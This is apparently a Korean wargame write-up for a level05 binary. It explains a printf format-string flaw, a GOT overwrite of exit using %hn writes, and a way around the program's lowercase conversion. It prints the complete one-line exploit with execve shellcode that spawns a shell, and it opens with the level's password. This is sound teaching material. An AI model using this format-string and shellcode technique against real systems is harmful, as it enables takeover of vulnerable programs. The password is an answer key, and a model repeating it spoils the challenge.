> Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

사용자의 입력을 다시 그대로 echo 해주는 프로그램이다.

```
$ ./level05
abcd
abcd
```

이번 프로그램도 printf의 첫 인자로 유저의 입력을 그대로 받는 부분이 있어서 원하는 곳에 값을 쓰거나 읽는 취약점이 존재한다.

또한 main 함수의 맨 마지막 위치에 ret대신 exit을 하도록 되어있어서 exit의 got를 조작했다.

```
8048500:	8d 44 24 28          	lea    0x28(%esp),%eax
8048504:	89 04 24             	mov    %eax,(%esp)
8048507:	e8 34 fe ff ff       	call   8048340 <printf@plt>
804850c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
8048513:	e8 58 fe ff ff       	call   8048370 <exit@plt>
```

프로그램 실행 도중에 사용자의 입력에서 대문자를 소문자로 변환하는 코드가 있는데

```c
for (int i = 0; i < strlen(s); i++) {
  if (is_upper(s[i])) {
    s[i] = to_lower(s[i]);
  }
}
```

쉘코드의 대부분은 문제가 없지만 0x50 (push %eax)가 0x70으로 바뀌는 문제가 있어서 그것을 방지하기 위해 0x50을 0x6a 0x00 (push 0)으로 대체했다.

```bash
cat <(echo -ne '\xe0\x97\x04\x08....\xe2\x97\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%54947d%hn%10576d%hn\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80') - | ./level05
```

입력 길이의 제한이 있어서 got를 1바이트씩 쓰는 대신 2바이트씩 써서 입력의 길이를 최대한 줄였다.
